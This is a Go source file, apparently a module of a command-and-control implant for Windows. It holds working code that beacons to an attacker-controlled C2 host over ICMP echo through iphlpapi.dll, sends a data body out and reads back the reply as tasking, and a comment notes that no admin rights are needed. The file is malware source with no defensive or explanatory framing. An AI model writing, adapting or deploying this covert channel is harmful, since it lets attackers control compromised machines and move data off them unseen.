//go:build windows
// +build windows

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"syscall"
	"time"
	"unsafe"
)

// Windows ICMP via IcmpSendEcho2 (iphlpapi.dll) — no admin required for sending.
var (
	iphlpapi           = syscall.NewLazyDLL("iphlpapi.dll")
	procIcmpCreateFile  = iphlpapi.NewProc("IcmpCreateFile")
	procIcmpSendEcho    = iphlpapi.NewProc("IcmpSendEcho")
	procIcmpCloseHandle = iphlpapi.NewProc("IcmpCloseHandle")
)

type icmpEchoReply struct {
	Address       [4]byte
	Status        uint32
	RoundTripTime uint32
	DataSize      uint16
	Reserved      uint16
	Data          unsafe.Pointer
	Options       [8]byte
}

func sendICMPBeacon(body []byte) []byte {
	if C2URL == "" {
		return nil
	}
	host := C2URL
	if len(C2URLs) > 0 {
		host = C2URLs[currentC2Idx]
	}

	ips, err := net.LookupIP(host)
	if err != nil || len(ips) == 0 {
		return nil
	}
	var ip4 net.IP
	for _, ip := range ips {
		if ip4 = ip.To4(); ip4 != nil {
			break
		}
	}
	if ip4 == nil {
		return nil
	}
	var addr [4]byte
	copy(addr[:], ip4[:4])

	h, _, _ := procIcmpCreateFile.Call()
	if h == 0 || h == ^uintptr(0) {
		return nil
	}
	defer procIcmpCloseHandle.Call(h)

	replyBuf := make([]byte, 8+len(body)+64)
	var replyPtr uintptr
	if len(replyBuf) > 0 {
		replyPtr = uintptr(unsafe.Pointer(&replyBuf[0]))
	}

	ret, _, _ := procIcmpSendEcho.Call(
		h,
		uintptr(binary.LittleEndian.Uint32(addr[:])),
		uintptr(unsafe.Pointer(&body[0])),
		uintptr(len(body)),
		0,
		0,
		replyPtr,
		uintptr(len(replyBuf)),
		5000,
	)

	_ = ret
	if len(replyBuf) < 8 {
		return nil
	}
	status := binary.LittleEndian.Uint32(replyBuf[4:8])
	if status != 0 {
		return nil
	}
	dataOffset := 8 + 4 + 4 + 2 + 2 + 8 + 8
	if dataOffset >= len(replyBuf) {
		return nil
	}
	dataSize := int(binary.LittleEndian.Uint16(replyBuf[12:14]))
	if dataSize == 0 || dataOffset+dataSize > len(replyBuf) {
		return nil
	}
	result := make([]byte, dataSize)
	copy(result, replyBuf[dataOffset:dataOffset+dataSize])
	return result
}

var _ = time.Second
var _ = fmt.Sprintf
